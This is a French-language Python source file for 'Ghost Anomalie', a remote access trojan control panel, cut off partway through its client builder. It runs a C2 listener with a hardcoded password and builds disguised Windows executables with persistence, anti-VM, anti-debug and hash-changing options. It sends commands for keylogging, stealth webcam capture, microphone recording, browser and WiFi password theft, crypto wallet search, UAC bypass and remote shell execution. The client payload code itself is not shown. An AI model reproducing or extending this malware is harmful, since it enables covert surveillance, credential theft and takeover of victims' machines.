# ghost_anomalie_final.py - Version COMPLÈTE avec TOUTES les commandes
import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, ttk, filedialog, messagebox
from datetime import datetime
import json
import base64
import os
import sys
import time
import subprocess
import shutil
import random
import string
import struct
import tempfile
from PIL import Image, ImageTk
import io
import zipfile

# ===== CONFIGURATION =====
VERSION = "1.3.0"
NOM_APP = "Ghost Anomalie"
AUTEUR = "🖤 Dev Messy from gabon"
COMMANDES_VERSION = "v1.0 - 92 commandes"

# ===== FENÊTRE PRINCIPALE =====
class GhostAnomalie:
    def __init__(self):
        self.serveur = None
        self.clients = {}
        self.running = False
        self.ip = ""
        self.port = 4444
        self.mot_de_passe = "admin123"
        self.partial_data = {}
        self.client_selectionne = None
        
        # === FENÊTRE ===
        self.window = tk.Tk()
        self.window.title("🐀 Ghost Anomalie")
        self.window.geometry("1500x950")
        self.window.configure(bg='#05050f')
        self.window.resizable(True, True)
        
        # === VARIABLES ===
        self.ip_var = tk.StringVar(value="127.0.0.1")
        self.port_var = tk.StringVar(value="4444")
        self.mdp_var = tk.StringVar(value="admin123")
        self.client_nom_var = tk.StringVar(value="GhostClient")
        self.client_nom_fichier_var = tk.StringVar(value="WindowsUpdate")
        
        # === CONSTRUIRE ===
        self.construire_interface()
        self.demarrer_serveur()
        
    # ============================================================
    # INTERFACE PRINCIPALE
    # ============================================================
    
    def construire_interface(self):
        self.window.configure(bg='#05050f')
        
        # ===== HEADER =====
        header = tk.Frame(self.window, bg='#0a0a1a', height=90)
        header.pack(fill=tk.X, padx=0, pady=0)
        header.pack_propagate(False)
        
        # Titre avec effet néon
        titre = tk.Label(header, text="👻 GHOST ANOMALIE", 
                        font=('Arial Black', 32, 'bold'), 
                        fg='#00ff88', bg='#0a0a1a')
        titre.pack(side=tk.LEFT, padx=20, pady=10)
        
        # Version
        tk.Label(header, text=f"v{VERSION} • {COMMANDES_VERSION}", 
                font=('Arial', 10), fg='#666', bg='#0a0a1a').pack(side=tk.LEFT, padx=10)
        
        # Status
        self.status_header = tk.Label(header, text="🔴 OFFLINE", 
                                     font=('Arial', 14, 'bold'),
                                     fg='#ff3333', bg='#0a0a1a')
        self.status_header.pack(side=tk.RIGHT, padx=20)
        
        # ===== PANEL PRINCIPAL =====
        main_panel = tk.Frame(self.window, bg='#05050f')
        main_panel.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # ===== GAUCHE : CONFIG + GÉNÉRATEUR =====
        left_panel = tk.Frame(main_panel, bg='#0a0a1a', width=400)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, padx=(0, 10))
        left_panel.pack_propagate(False)
        
        # --- SCROLL POUR GAUCHE ---
        left_canvas = tk.Canvas(left_panel, bg='#0a0a1a', highlightthickness=0)
        left_scrollbar = tk.Scrollbar(left_panel, orient="vertical", command=left_canvas.yview)
        left_scrollable = tk.Frame(left_canvas, bg='#0a0a1a')
        
        left_scrollable.bind(
            "<Configure>",
            lambda e: left_canvas.configure(scrollregion=left_canvas.bbox("all"))
        )
        
        left_canvas.create_window((0, 0), window=left_scrollable, anchor="nw")
        left_canvas.configure(yscrollcommand=left_scrollbar.set)
        
        left_canvas.pack(side="left", fill="both", expand=True)
        left_scrollbar.pack(side="right", fill="y")
        
        # --- CONTENU GAUCHE ---
        # Titre
        tk.Label(left_scrollable, text="⚙️ CONFIGURATION C2", 
                font=('Arial', 16, 'bold'), fg='#00ff88', bg='#0a0a1a').pack(pady=10)
        
        # Cadre Config
        config_frame = tk.LabelFrame(left_scrollable, text="📍 Serveur de Contrôle", 
                                    fg='#00ff88', bg='#0a0a1a', font=('Arial', 11))
        config_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # IP
        tk.Label(config_frame, text="🌐 IP du serveur:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        ip_entry = tk.Entry(config_frame, textvariable=self.ip_var, bg='#1a1a2e', 
                           fg='#00ff88', insertbackground='white', font=('Courier', 11))
        ip_entry.pack(fill=tk.X, padx=5, pady=2)
        
        # Port
        tk.Label(config_frame, text="🔌 Port:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        port_entry = tk.Entry(config_frame, textvariable=self.port_var, bg='#1a1a2e', 
                             fg='#00ff88', insertbackground='white', font=('Courier', 11))
        port_entry.pack(fill=tk.X, padx=5, pady=2)
        
        # Mot de passe
        tk.Label(config_frame, text="🔑 Mot de passe:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        mdp_entry = tk.Entry(config_frame, textvariable=self.mdp_var, bg='#1a1a2e', 
                            fg='#00ff88', insertbackground='white', font=('Courier', 11),
                            show="•")
        mdp_entry.pack(fill=tk.X, padx=5, pady=2)
        
        # Boutons Serveur
        btn_frame = tk.Frame(left_scrollable, bg='#0a0a1a')
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.btn_start = tk.Button(btn_frame, text="▶️ START SERVER", 
                                  command=self.basculer_serveur,
                                  bg='#00ff88', fg='#05050f', font=('Arial', 13, 'bold'),
                                  padx=20, pady=8, relief=tk.FLAT, cursor='hand2')
        self.btn_start.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        # --- Cadre Générateur ---
        gen_frame = tk.LabelFrame(left_scrollable, text="🎯 GÉNÉRATEUR DE CLIENT", 
                                 fg='#ffaa00', bg='#0a0a1a', font=('Arial', 11))
        gen_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Nom du client (affiché)
        tk.Label(gen_frame, text="👤 Nom du client (affiché):", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        tk.Entry(gen_frame, textvariable=self.client_nom_var, bg='#1a1a2e', 
                fg='#00ff88', insertbackground='white', font=('Courier', 11)).pack(fill=tk.X, padx=5, pady=2)
        
        # Nom du fichier EXE
        tk.Label(gen_frame, text="📁 Nom du fichier EXE:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        tk.Entry(gen_frame, textvariable=self.client_nom_fichier_var, bg='#1a1a2e', 
                fg='#00ff88', insertbackground='white', font=('Courier', 11)).pack(fill=tk.X, padx=5, pady=2)
        
        tk.Label(gen_frame, text="💡 Ex: WindowsUpdate, svchost, explorer", 
                fg='#666', bg='#0a0a1a', font=('Arial', 8)).pack(anchor=tk.W, padx=5)
        
        # Options
        options_frame = tk.LabelFrame(gen_frame, text="🛡️ Options", 
                                     fg='#00aaff', bg='#0a0a1a', font=('Arial', 9))
        options_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.persist_var = tk.BooleanVar(value=True)
        self.hide_var = tk.BooleanVar(value=True)
        self.startup_var = tk.BooleanVar(value=True)
        self.anti_vm_var = tk.BooleanVar(value=True)
        self.anti_debug_var = tk.BooleanVar(value=True)
        self.polymorph_var = tk.BooleanVar(value=True)
        self.inject_var = tk.BooleanVar(value=False)
        
        check_frame = tk.Frame(options_frame, bg='#0a0a1a')
        check_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Checkbutton(check_frame, text="🔄 Persistance", variable=self.persist_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="👻 Caché (processus invisible)", variable=self.hide_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🚀 Démarrage auto", variable=self.startup_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🛡️ Anti-VM (détection sandbox)", variable=self.anti_vm_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🔍 Anti-Debug", variable=self.anti_debug_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🎭 Polymorphisme (change de hash)", variable=self.polymorph_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="💉 Injection processus", variable=self.inject_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        
        # Bouton générer
        self.btn_generate = tk.Button(gen_frame, text="🔥 GENERER CLIENT .EXE", 
                                     command=self.generer_client,
                                     bg='#ff4400', fg='white', font=('Arial', 15, 'bold'),
                                     padx=20, pady=12, relief=tk.FLAT, cursor='hand2')
        self.btn_generate.pack(fill=tk.X, padx=5, pady=10)
        
        # Status génération
        self.status_gen = tk.Label(gen_frame, text="✅ Prêt à générer", 
                                  fg='#00ff88', bg='#0a0a1a', font=('Arial', 9))
        self.status_gen.pack(pady=2)
        
        # --- Clients connectés ---
        clients_frame = tk.LabelFrame(left_scrollable, text="👥 CLIENTS CONNECTÉS", 
                                     fg='#00aaff', bg='#0a0a1a', font=('Arial', 11))
        clients_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.clients_listbox = tk.Listbox(clients_frame, bg='#0a0a1a', fg='#00ff88',
                                         font=('Courier', 10), selectbackground='#1a1a2e',
                                         height=8)
        self.clients_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.clients_listbox.bind('<<ListboxSelect>>', self.selectionner_client)
        
        # ===== DROITE : CONTROLE =====
        right_panel = tk.Frame(main_panel, bg='#0a0a1a')
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # --- TITRE ---
        tk.Label(right_panel, text="💻 CONTRÔLE À DISTANCE", 
                font=('Arial', 16, 'bold'), fg='#00ff88', bg='#0a0a1a').pack(pady=5)
        
        # --- Info client sélectionné ---
        self.info_frame = tk.LabelFrame(right_panel, text="📡 Client actuel", 
                                       fg='#ffaa00', bg='#0a0a1a', font=('Arial', 10))
        self.info_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.client_info = tk.Label(self.info_frame, text="Aucun client sélectionné", 
                                   fg='#aaa', bg='#0a0a1a', font=('Arial', 11))
        self.client_info.pack(padx=10, pady=5)
        
        # --- Commandes ---
        cmd_frame = tk.LabelFrame(right_panel, text="⌨️ COMMANDES", 
                                 fg='#00ff88', bg='#0a0a1a', font=('Arial', 10))
        cmd_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Ligne de commande
        cmd_row = tk.Frame(cmd_frame, bg='#0a0a1a')
        cmd_row.pack(fill=tk.X, padx=5, pady=5)
        
        self.entry_cmd = tk.Entry(cmd_row, bg='#1a1a2e', fg='#00ff88', 
                                 insertbackground='white', font=('Courier', 11))
        self.entry_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.entry_cmd.bind('<Return>', lambda e: self.envoyer_commande())
        
        tk.Button(cmd_row, text="🚀", command=self.envoyer_commande,
                 bg='#1a1a2e', fg='#00ff88', font=('Arial', 14)).pack(side=tk.RIGHT)
        
        # Catégories de commandes (avec SCROLL)
        cat_frame = tk.LabelFrame(cmd_frame, text="📋 Commandes rapides", 
                                 fg='#00aaff', bg='#0a0a1a', font=('Arial', 9))
        cat_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Canvas pour scroll des catégories
        cat_canvas = tk.Canvas(cat_frame, bg='#0a0a1a', highlightthickness=0, height=120)
        cat_scrollbar = tk.Scrollbar(cat_frame, orient="vertical", command=cat_canvas.yview)
        cat_scrollable = tk.Frame(cat_canvas, bg='#0a0a1a')
        
        cat_scrollable.bind(
            "<Configure>",
            lambda e: cat_canvas.configure(scrollregion=cat_canvas.bbox("all"))
        )
        
        cat_canvas.create_window((0, 0), window=cat_scrollable, anchor="nw")
        cat_canvas.configure(yscrollcommand=cat_scrollbar.set)
        
        # CATÉGORIES DE COMMANDES
        categories = [
            ("🖥️ Bureau", ["screenshot", "bureau", "bureau_start 30 10", "bureau_stop", "rotation 90", "ecran_noir"]),
            ("🖱️ Souris", ["souris_move 0.5 0.5", "souris_click 1", "souris_click 1 double", "souris_scroll down 3"]),
            ("⌨️ Clavier", ["clavier_texte Bonjour", "clavier_touche enter", "clavier_touche ctrl+c combinaison"]),
            ("🚀 Apps", ["app_lancer notepad.exe", "app_lancer cmd.exe invisible", "app_cacher_tout", "app_montrer_tout"]),
            ("📷 Cam/Mic", ["camera_start", "camera_photo", "camera_stealth", "micro_start", "micro_record 5"]),
            ("🔑 Keylog", ["keylogger_start", "keylogger_stop", "keylogger_export"]),
            ("🔐 Passwords", ["pass_wifi", "pass_chrome", "crypto_wallets", "pass_all"]),
            ("📁 Fichiers", ["ls", "cd ..", "pwd", "download fichier.txt", "mkdir test"]),
            ("🌐 Network", ["network_scan", "port_scan 192.168.1.1", "wifi_list", "dns_flush"]),
            ("⚙️ System", ["sysinfo", "cmd ipconfig", "lock", "shutdown", "restart"]),
            ("🕵️ Surf", ["surveillance_start", "surveillance_stop", "search_files mot"]),
            ("🎥 Record", ["record_start 20 10", "record_stop"]),
            ("🛡️ Hide", ["hide", "persist", "uac_bypass", "selfdestruct"]),
            ("📋 Clipboard", ["clipboard_get", "clipboard_set Texte", "clipboard_monitor"]),
            ("⚙️ Proc", ["processus_list", "processus_kill 1234", "service_list"]),
            ("🎮 Blagues", ["popup 'Salut !'", "speak 'Bonjour'", "volume_mute", "cd_eject"]),
        ]
        
        for categorie, commandes in categories:
            tk.Label(cat_scrollable, text=categorie, fg='#ffaa00', bg='#0a0a1a',
                    font=('Arial', 9, 'bold')).pack(anchor=tk.W, pady=2)
            
            btn_row = tk.Frame(cat_scrollable, bg='#0a0a1a')
            btn_row.pack(fill=tk.X, pady=1)
            
            for cmd in commandes:
                tk.Button(btn_row, text=cmd[:15], 
                         command=lambda c=cmd: self.entry_cmd.delete(0, tk.END) or self.entry_cmd.insert(0, c),
                         bg='#1a1a2e', fg='#00ff88', font=('Arial', 7), padx=3, pady=1).pack(side=tk.LEFT, padx=1)
        
        cat_canvas.pack(side="left", fill="both", expand=True)
        cat_scrollbar.pack(side="right", fill="y")
        
        # --- Résultats ---
        result_frame = tk.LabelFrame(right_panel, text="📝 LOGS & RÉSULTATS", 
                                    fg='#00aaff', bg='#0a0a1a', font=('Arial', 10))
        result_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.logs = scrolledtext.ScrolledText(result_frame, bg='#05050f', fg='#00ff88',
                                             font=('Courier', 9), insertbackground='white')
        self.logs.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # --- Image preview ---
        self.image_frame = tk.Frame(right_panel, bg='#0a0a1a', height=150)
        self.image_frame.pack(fill=tk.X, padx=10, pady=5)
        self.image_label = tk.Label(self.image_frame, bg='#0a0a1a', 
                                   text="📸 Aperçu images", fg='#666', font=('Arial', 12))
        self.image_label.pack(expand=True, fill=tk.BOTH)
        
        # ===== BARRE D'ÉTAT =====
        status_bar = tk.Frame(self.window, bg='#0a0a1a', height=30)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.status_text = tk.Label(status_bar, text="👻 Ghost Anomalie - Prêt", 
                                   fg='#666', bg='#0a0a1a', font=('Arial', 9))
        self.status_text.pack(side=tk.LEFT, padx=10)
        
        self.status_clients = tk.Label(status_bar, text="👥 0 clients", 
                                      fg='#00ff88', bg='#0a0a1a', font=('Arial', 9))
        self.status_clients.pack(side=tk.RIGHT, padx=10)
        
        self.status_commande = tk.Label(status_bar, text=f"📋 {COMMANDES_VERSION}", 
                                       fg='#666', bg='#0a0a1a', font=('Arial', 8))
        self.status_commande.pack(side=tk.RIGHT, padx=10)
        
        # Lancer la mise à jour
        self.mettre_a_jour_interface()
        
        # Log initial
        self.log("👻 Ghost Anomalie v" + VERSION + " - " + COMMANDES_VERSION)
        self.log("📋 " + str(len(self.get_all_commandes())) + " commandes disponibles")
        self.log("💡 Sélectionne un client dans la liste pour commencer")
    
    # ============================================================
    # LISTE COMPLÈTE DES COMMANDES
    # ============================================================
    
    def get_all_commandes(self):
        """Retourne la liste de TOUTES les commandes disponibles"""
        return {
            # Bureau
            "screenshot": "Capture d'écran",
            "bureau": "Bureau à distance (stream)",
            "bureau_start": "Démarrer stream bureau (qualité FPS)",
            "bureau_stop": "Arrêter stream bureau",
            "bureau_ecrans": "Lister les écrans",
            "ecran_noir": "Activer écran noir",
            "ecran_normal": "Désactiver écran noir",
            "rotation": "Rotation écran (0,90,180,270)",
            
            # Souris
            "souris_move": "Déplacer souris (x y)",
            "souris_click": "Clic souris (1=gauche,2=droit,3=milieu)",
            "souris_scroll": "Défiler (up/down quantite)",
            "souris_glisser": "Glisser-déposer (x1 y1 x2 y2)",
            
            # Clavier
            "clavier_texte": "Écrire du texte",
            "clavier_touche": "Appuyer sur une touche",
            
            # Apps cachées
            "app_lancer": "Lancer application (visible/invisible/admin)",
            "app_visible": "Rendre visible (PID)",
            "app_invisible": "Rendre invisible (PID)",
            "app_cacher_tout": "Cacher TOUTES les fenêtres",
            "app_montrer_tout": "Montrer toutes les fenêtres",
            "app_fenetres": "Lister les fenêtres ouvertes",
            
            # Caméra
            "camera_start": "Démarrer caméra",
            "camera_stop": "Arrêter caméra",
            "camera_photo": "Prendre photo",
            "camera_stealth": "Photo furtive (LED off)",
            
            # Micro
            "micro_start": "Démarrer micro",
            "micro_stop": "Arrêter micro",
            "micro_record": "Enregistrer audio (secondes)",
            
            # Keylogger
            "keylogger_start": "Démarrer keylogger",
            "keylogger_stop": "Arrêter keylogger",
            "keylogger_export": "Exporter logs keylogger",
            
            # Presse-papiers
            "clipboard_get": "Lire presse-papiers",
            "clipboard_set": "Écrire dans presse-papiers",
            "clipboard_monitor": "Surveiller presse-papiers",
            
            # Vol de données
            "pass_wifi": "Extraire mots de passe WiFi",
            "pass_chrome": "Extraire mots de passe Chrome",
            "pass_firefox": "Extraire mots de passe Firefox",
            "pass_edge": "Extraire mots de passe Edge",
            "pass_all": "Extraire TOUS les mots de passe",
            "crypto_wallets": "Trouver portefeuilles crypto",
            
            # Surveillance
            "surveillance_start": "Démarrer surveillance",
            "surveillance_stop": "Arrêter surveillance",
            "search_files": "Rechercher fichiers (motif)",
            "search_docs": "Rechercher documents (.pdf, .docx)",
            
            # Réseau
            "network_scan": "Scanner réseau (IP/range)",
            "port_scan": "Scanner ports (IP ports)",
            "arp_scan": "Scanner ARP",
            "wifi_list": "Lister réseaux WiFi",
            "wifi_connect": "Se connecter à un WiFi",
            "dns_flush": "Vider cache DNS",
            
            # Processus
            "processus_list": "Lister processus",
            "processus_kill": "Tuer processus (PID)",
            "service_list": "Lister services",
            "service_start": "Démarrer service",
            "service_stop": "Arrêter service",
            
            # Fichiers
            "ls": "Lister fichiers",
            "cd": "Changer dossier",
            "pwd": "Dossier actuel",
            "mkdir": "Créer dossier",
            "rm": "Supprimer fichier/dossier",
            "mv": "Renommer/déplacer",
            "download": "Télécharger fichier",
            "upload": "Uploader fichier",
            
            # Enregistrement
            "record_start": "Démarrer enregistrement vidéo",
            "record_stop": "Arrêter enregistrement",
            
            # Furtivité
            "hide": "Cacher le processus",
            "persist": "Ajouter persistance",
            "uac_bypass": "Contourner UAC",
            "polymorph": "Changer hash du fichier",
            "inject": "Injection dans processus",
            "update": "Mise à jour automatique",
            "selfdestruct": "Auto-destruction",
            
            # Anti-détection
            "anti_vm": "Détecter VM",
            "anti_debug": "Détecter debug",
            "anti_av": "Détecter antivirus",
            
            # Divertissement
            "popup": "Afficher popup",
            "speak": "Synthèse vocale",
            "website": "Ouvrir site web",
            "beep": "Faire un bip",
            "cd_eject": "Ouvrir lecteur CD",
            "cd_close": "Fermer lecteur CD",
            "mouse_disable": "Désactiver souris",
            "mouse_enable": "Réactiver souris",
            "keyboard_disable": "Désactiver clavier",
            "keyboard_enable": "Réactiver clavier",
            "volume_set": "Régler volume",
            "volume_mute": "Couper le son",
            
            # Système
            "sysinfo": "Infos système",
            "cmd": "Exécuter commande système",
            "shutdown": "Éteindre PC",
            "restart": "Redémarrer PC",
            "lock": "Verrouiller écran",
            "logoff": "Déconnexion",
            "hibernate": "Mettre en veille",
            
            # Autres
            "exit": "Déconnecter client"
        }
    
    # ============================================================
    # FONCTIONS SERVEUR
    # ============================================================
    
    def demarrer_serveur(self):
        try:
            self.ip = self.ip_var.get()
            self.port = int(self.port_var.get())
            self.mot_de_passe = self.mdp_var.get()
            
            self.serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.serveur.bind(('0.0.0.0', self.port))
            self.serveur.listen(10)
            self.running = True
            
            self.status_header.config(text="🟢 ONLINE", fg='#00ff88')
            self.btn_start.config(text="⏹️ STOP SERVER", bg='#ff3333')
            self.log(f"✅ Serveur démarré sur le port {self.port}")
            self.log(f"📡 IP: {self.ip} | 🔑 Mot de passe: {self.mot_de_passe}")
            
            threading.Thread(target=self.accepter_clients, daemon=True).start()
            
        except Exception as e:
            self.log(f"❌ Erreur démarrage: {e}")
            messagebox.showerror("Erreur", f"Impossible de démarrer le serveur:\n{e}")
    
    def arreter_serveur(self):
        self.running = False
        if self.serveur:
            try:
                self.serveur.close()
            except:
                pass
        
        self.status_header.config(text="🔴 OFFLINE", fg='#ff3333')
        self.btn_start.config(text="▶️ START SERVER", bg='#00ff88')
        self.log("⏹️ Serveur arrêté")
    
    def basculer_serveur(self):
        if self.running:
            self.arreter_serveur()
        else:
            self.demarrer_serveur()
    
    def accepter_clients(self):
        while self.running:
            try:
                client, addr = self.serveur.accept()
                self.log(f"🔗 Nouvelle connexion de {addr[0]}")
                
                auth_req = client.recv(1024).decode()
                if auth_req.startswith("AUTH|"):
                    data = auth_req[5:].split('|')
                    mdp = data[0] if len(data) > 0 else ""
                    nom = data[1] if len(data) > 1 else addr[0]
                    
                    if mdp == self.mot_de_passe:
                        client.send(b"AUTH|OK")
                        self.clients[addr] = {
                            'socket': client,
                            'nom': nom,
                            'ip': addr[0],
                            'port': addr[1],
                            'connecte': True,
                            'temps': time.time()
                        }
                        self.log(f"✅ Client authentifié: {nom} ({addr[0]})")
                        threading.Thread(target=self.gerer_client, args=(client, addr), daemon=True).start()
                    else:
                        client.send(b"AUTH|ERREUR")
                        client.close()
                        self.log(f"❌ Refusé: {addr[0]} (mauvais mot de passe)")
            except:
                pass
    
    def gerer_client(self, client, addr):
        while self.running and addr in self.clients:
            try:
                data = client.recv(8192).decode()
                if not data:
                    break
                
                if data.startswith("RESULTAT|"):
                    resultat = data[9:]
                    if resultat == "__FIN__":
                        continue
                    self.afficher_resultat(resultat)
                
                elif data.startswith("BUREAU|"):
                    parts = data[7:].split('|')
                    if len(parts) >= 3:
                        img_data = parts[2]
                        self.afficher_image(img_data)
                
                elif data.startswith("CAMERA|"):
                    self.afficher_image(data[7:])
                
                elif data.startswith("PHOTO|"):
                    self.afficher_image(data[6:])
                
                elif data.startswith("KEYLOG|"):
                    self.log(f"⌨️ Keylogger: {data[7:]}")
                
                elif data.startswith("ALERTE|"):
                    self.log(f"🚨 ALERTE: {data[7:]}")
                
                elif data.startswith("FICHIERS_TROUVES|"):
                    self.log(f"📁 Nouveaux fichiers: {data[16:][:200]}")
                
                elif data.startswith("INFO|"):
                    self.log(f"ℹ️ {data[5:]}")
                
                elif data.startswith("AUDIO|"):
                    self.log(f"🎤 Audio reçu")
                    # Sauvegarder audio
                    try:
                        audio_data = data[6:]
                        audio_bytes = base64.b64decode(audio_data)
                        os.makedirs("audio", exist_ok=True)
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        with open(f"audio/audio_{timestamp}.wav", 'wb') as f:
                            f.write(audio_bytes)
                        self.log(f"💾 Audio sauvegardé: audio_{timestamp}.wav")
                    except:
                        pass
                
            except Exception as e:
                self.log(f"⚠️ Erreur client {addr[0]}: {e}")
                break
        
        if addr in self.clients:
            nom = self.clients[addr].get('nom', addr[0])
            del self.clients[addr]
            self.log(f"🔌 Client déconnecté: {nom}")
    
    # ============================================================
    # ENVOI DE COMMANDES
    # ============================================================
    
    def envoyer_commande(self):
        cmd = self.entry_cmd.get()
        if not cmd:
            return
        
        # Vérifier si un client est sélectionné
        selection = self.clients_listbox.curselection()
        if not selection:
            self.log("❌ Aucun client sélectionné")
            return
        
        # Récupérer l'info du client
        index = selection[0]
        item = self.clients_listbox.get(index)
        
        client = None
        for addr, info in self.clients.items():
            if f"{info['nom']} ({info['ip']})" == item:
                client = info
                break
        
        if not client:
            self.log("❌ Client non trouvé")
            return
        
        try:
            client['socket'].send(cmd.encode())
            self.log(f"📤 {cmd}")
            self.entry_cmd.delete(0, tk.END)
            
            # Sauvegarder dans l'historique
            if not hasattr(self, 'historique_cmd'):
                self.historique_cmd = []
            self.historique_cmd.append(cmd)
            if len(self.historique_cmd) > 50:
                self.historique_cmd = self.historique_cmd[-50:]
                
        except Exception as e:
            self.log(f"❌ Erreur: {e}")
    
    def selectionner_client(self, event):
        selection = self.clients_listbox.curselection()
        if selection:
            item = self.clients_listbox.get(selection[0])
            self.client_info.config(text=f"🎯 {item}")
            self.log(f"📡 Client sélectionné: {item}")
    
    # ============================================================
    # AFFICHAGE
    # ============================================================
    
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.logs.insert(tk.END, f"[{timestamp}] {message}\n")
        self.logs.see(tk.END)
        self.status_text.config(text=message[:60])
    
    def afficher_resultat(self, resultat):
        # Image
        if resultat.startswith("[PHOTO]") or resultat.startswith("[IMAGE]"):
            img_data = resultat[7:] if resultat.startswith("[PHOTO]") else resultat[7:]
            self.afficher_image(img_data)
            return
        
        # Fichier
        if resultat.startswith("[FICHIER]"):
            parts = resultat[9:].split('|')
            if len(parts) >= 3:
                nom = parts[0]
                contenu = parts[2]
                
                file_path = filedialog.asksaveasfilename(initialfile=nom)
                if file_path:
                    try:
                        with open(file_path, 'wb') as f:
                            f.write(base64.b64decode(contenu))
                        self.log(f"💾 Fichier sauvegardé: {file_path}")
                    except Exception as e:
                        self.log(f"❌ Erreur sauvegarde: {e}")
                return
        
        # JSON
        try:
            data = json.loads(resultat)
            if isinstance(data, dict):
                formatted = json.dumps(data, indent=2, ensure_ascii=False)[:1000]
                self.log(f"📊 {formatted}")
                return
        except:
            pass
        
        # Normal
        if len(resultat) > 500:
            self.log(f"📥 {resultat[:500]}...")
        else:
            self.log(f"📥 {resultat}")
    
    def afficher_image(self, img_data):
        try:
            img_bytes = base64.b64decode(img_data)
            image = Image.open(io.BytesIO(img_bytes))
            
            max_w = 400
            max_h = 250
            ratio = min(max_w/image.width, max_h/image.height)
            new_size = (int(image.width*ratio), int(image.height*ratio))
            image = image.resize(new_size, Image.Resampling.LANCZOS)
            
            photo = ImageTk.PhotoImage(image)
            self.image_label.config(image=photo, text="")
            self.image_label.image = photo
            
            os.makedirs("captures", exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            image.save(f"captures/image_{timestamp}.jpg")
            self.log(f"💾 Image sauvegardée: image_{timestamp}.jpg")
            
        except Exception as e:
            self.log(f"❌ Erreur image: {e}")
    
    # ============================================================
    # GÉNÉRATEUR DE CLIENT (avec TOUTES les commandes)
    # ============================================================
    
    def generer_client(self):
        try:
            self.status_gen.config(text="⏳ Génération en cours...", fg='#ffaa00')
            self.log("🔥 Génération du client avec TOUTES les commandes...")
            
            ip = self.ip_var.get()
            port = self.port_var.get()
            mdp = self.mdp_var.get()
            nom_client = self.client_nom_var.get()
            nom_fichier = self.client_nom_fichier_var.get()
            
            # Nettoyer le nom du fichier
            nom_fichier = ''.join(c for c in nom_fichier if c.isalnum() or c in ['_', '-'])
            if not nom_fichier:
                nom_fichier = "GhostClient"
            
            # Options
            persist = self.persist_var.get()
            hide = self.hide_var.get()
            startup = self.startup_var.get()
            anti_vm = self.anti_vm_var.get()
            anti_debug = self.anti_debug_var.get()
            polymorph = self.polymorph_var.get()
            inject = self.inject_var.get()
            
            # Créer le dossier de build
            build_dir = os.path.join(os.getcwd(), "build_client")
            os.makedirs(build_dir, exist_ok=True)
            
            # === GÉNÉRER LE CODE CLIENT COMPLET ===
            client_code = self.generer_code_client_complet(
                ip, port, mdp, nom_client, nom_fichier,
                persist, hide, startup, anti_vm, anti_debug, polymorph, inject
            )
            
            # Sauvegarder le code
            client_file = os.path.join(build_dir, "client.py")
            with open(client_file, 'w', encoding='utf-8') as f:
                f.write(client_code)
            
            # === COMPILER AVEC PYINSTALLER ===
            self.log("🔧 Compilation en cours (5-10 minutes)...")
            
            try:
                import PyInstaller
            except ImportError:
                subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                             capture_output=True)
            
            # Créer le dossier clients
            clients_dir = os.path.join(os.getcwd(), "clients")
            os.makedirs(clients_dir, exist_ok=True)
            
            # Commande pyinstaller
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--name", nom_fichier,
                "--distpath", clients_dir,
                "--workpath", os.path.join(build_dir, "build"),
                "--specpath", build_dir,
                "--log-level", "WARN",
                "--hidden-import", "PIL",
                "--hidden-import", "PIL.ImageGrab",
                "--hidden-import", "cv2",
                "--hidden-import", "pyaudio",
                "--hidden-import", "wave",
                "--hidden-import", "win32api",
                "--hidden-import", "win32con",
                "--hidden-import", "win32gui",
                "--hidden-import", "win32process",
                "--hidden-import", "win32clipboard",
                "--hidden-import", "win32ui",
                "--hidden-import", "win32pdh",
                "--hidden-import", "win32security",
                "--hidden-import", "win32file",
                "--hidden-import", "win32event",
                "--hidden-import", "win32service",
                "--hidden-import", "win32serviceutil",
                "--hidden-import", "win32com.client",
                "--hidden-import", "wmi",
